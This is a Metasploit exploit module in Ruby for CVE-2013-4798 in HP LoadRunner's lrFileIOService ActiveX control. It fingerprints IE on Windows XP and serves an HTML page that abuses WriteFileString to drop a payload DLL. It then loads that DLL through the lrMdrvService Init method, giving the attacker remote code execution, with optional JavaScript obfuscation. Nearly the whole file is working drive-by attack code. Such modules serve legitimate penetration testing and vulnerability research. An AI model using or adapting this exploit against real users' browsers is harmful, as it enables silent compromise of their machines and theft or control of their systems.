##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::EXE

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "8.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :os_ver     => OperatingSystems::WindowsVersions::XP,
    :rank       => NormalRanking,
    :classid    => "{8D9E2CC7-D94B-4977-8510-FB49C361A139}",
    :method     => "WriteFileString "
  })

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP LoadRunner lrFileIOService ActiveX WriteFileString Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed
        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileString method,
        which allow the user to write arbitrary files. It's abused to drop a payload
        embedded in a dll, which is later loaded through the Init() method from the
        lrMdrvService control, by abusing an insecure LoadLibrary call. This module has
        been tested successfully on IE8 on Windows XP. Virtualization based on the Low
        Integrity Process, on Windows Vista and 7, will stop this module because the DLL
        will be dropped to a virtualized folder, which isn't used by LoadLibrary.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brian Gorenc', # Vulnerability discovery
          'juan vazquez'  # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4798' ],
          [ 'OSVDB', '95642' ],
          [ 'BID', '61443'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-207/' ],
          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772' ]
        ],
      'Payload'    =>
        {
          'Space'        => 2048,
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic IE on Windows XP', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jul 24 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  # Just reminding the user to delete LrWeb2MdrvLoader.dll
  # because migration and killing the exploited process is
  # needed
  def on_new_session(session)
    print_status("New session... remember to delete LrWeb2MdrvLoader.dll")
  end

  def is_target?(agent)
    if agent =~ /Windows NT 5\.1/ and agent =~ /MSIE/
      return true
    end

    return false
  end

  def create_dll_js(object_id, dll_data)
    dll_js = ""
    first = true
    dll_data.each_char { |chunk|
      if first
        dll_js << "#{object_id}.WriteFileString(\"LrWeb2MdrvLoader.dll\", unescape(\"%u01#{Rex::Text.to_hex(chunk, "")}\"), false, \"UTF-8\");\n"
        first = false
      else
        dll_js << "#{object_id}.WriteFileString(\"LrWeb2MdrvLoader.dll\", unescape(\"%u01#{Rex::Text.to_hex(chunk, "")}\"), true, \"UTF-8\");\n"
      end
    }
    return dll_js
  end

  def load_exploit_html(cli)
    return nil if ((p = regenerate_payload(cli)) == nil)

    file_io = rand_text_alpha(rand(10) + 8)
    mdrv_service = rand_text_alpha(rand(10) + 8)
    dll_data = generate_payload_dll({ :code => p.encoded })
    drop_dll_js = create_dll_js(file_io, dll_data)

    html = %Q|
    <html>
    <body>
    <object classid='clsid:8D9E2CC7-D94B-4977-8510-FB49C361A139' id='#{file_io}'></object>
    <object classid='clsid:9EE336F8-04B7-4B9F-8421-B982E7A4785C' id='#{mdrv_service}'></object>
    <script language='javascript'>
    #{drop_dll_js}
    #{mdrv_service}.Init("-f #{rand_text_alpha(8 + rand(8))}", "#{rand_text_alpha(8 + rand(8))}");
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    # Avoid the attack if no suitable target found
    if not is_target?(agent)
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(cli)
    if html.nil?
      send_not_found(cli)
      return
    end
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
